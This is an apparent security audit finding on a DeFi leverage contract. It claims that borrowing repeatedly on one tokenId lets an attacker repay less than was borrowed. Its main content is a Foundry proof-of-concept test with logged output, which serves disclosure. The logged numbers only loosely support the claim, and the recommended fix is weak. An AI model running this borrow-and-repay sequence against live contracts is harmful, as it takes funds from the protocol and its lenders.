Brilliant Cornflower Viper

high

# Attacker can borrow a larger number of tokens and paying lesser fee when repaying debt

## Summary
An attacker can borrow a significant number of tokens and repay less than the actual borrowed amount.
 
## Vulnerability Detail
The attacker initiates borrowing by calling the borrow function. Subsequently, the attacker repetitively borrows using the same tokenId. This action results in additional tokens being borrowed without increasing the total tokens borrowed or the debt count. The attacker can then invoke the repay function, settling the initial debt while retaining surplus tokens

## Impact
This leads to loss of funds for the protocol

## Code Snippet

https://github.com/sherlock-audit/2024-02-leverage-contracts/blob/main/wagmi-leverage/contracts/LiquidityBorrowingManager.sol#L394

```solidity
function testBorrow() public {
        uint128 minLiqAmt = _minimumLiquidityAmt(253_320, 264_600);
        vm.startPrank(bob);
        console.log("initial blance of eth before borrowing", WETH.balanceOf(bob));
        // console.log("btc", WBTC.balanceOf(bob));
        uint256 bal;
        uint256 initialBobEThBalance;

        borrowingManager.borrow(createBorrowParams(tokenId, minLiqAmt), block.timestamp + 1);
        initialBobEThBalance = WETH.balanceOf(bob);
        console.log("after first borrow token", WETH.balanceOf(bob));
        bytes32[] memory key = borrowingManager.getBorrowingKeysForTokenId(tokenId);
        // console.log("btc", WBTC.balanceOf(bob));
        // vm.roll(2);
       

        borrowingManager.borrow(createBorrowParams(tokenId, minLiqAmt), block.timestamp + 1);
        // // vm.roll(2);
        console.log(" after second borrow token", WETH.balanceOf(bob));
       

        borrowingManager.borrow(createBorrowParams(tokenId, minLiqAmt), block.timestamp + 1);
        // // vm.roll(20);
        console.log(" after third borrow token", WETH.balanceOf(bob));
       

        borrowingManager.borrow(createBorrowParams(tokenId, minLiqAmt), block.timestamp + 1);
        console.log("afterfourth borrow token", WETH.balanceOf(bob));

        uint256 finalBobEthBalance = WETH.balanceOf(bob);
        bal = initialBobEThBalance - finalBobEthBalance;

        console.log("no of debt before repayment after four borrows", borrowingManager.getBorrowerDebtsCount(bob));

        // for (uint256 i = 0; i < key.length; i++) {
        //     (,,,, uint256 borrowed,,,) = borrowingManager.borrowingsInfo(key[i]);
        //     console.log(
        //         "after fourth borrow ...borrowed data stored is  ",
        //         borrowed,
        //         "total borrwed is ",
        //         bal
        //     );
        // }

        //  repay tokens
        uint holdTokens;
        for (uint256 i = 0; i < key.length; i++) {
           (uint saleOut,uint holdToken) = borrowingManager.repay(createRepayParams(key[i]), block.timestamp + 1);
           holdTokens = holdToken;
        }
        console.log("amount repayed : initial money used was 1e18", holdTokens); 
        console.log("amount of bob balance after repayment", WETH.balanceOf(bob));
        console.log("total token extra borrowed after 1st borrow", bal);
        console.log("no of debt after repayment", borrowingManager.getBorrowerDebtsCount(bob));
    }

```

```bash
 initial blance of eth before borrowing 10000000000000000000000
 after first borrow token 9999993780741420434871
 after second borrow token 9999981342368835366206
 after third borrow token 9999962684877499201596
  afterfourth borrow token 9999937808260293541899
  no of debt before repayment after four borrows 1
  amount repayed : initial money used was 1e18 136527062740648365
  amount of bob balance after repayment 10000074335323034190264
  total token extra borrowed after 1st borrow 55972481126892972
  no of debt after repayment 0
```

## Tool used

Manual Review

## Recommendation

Users should refrain from taking multiple loans with the same tokenId to mitigate this vulnerability. 
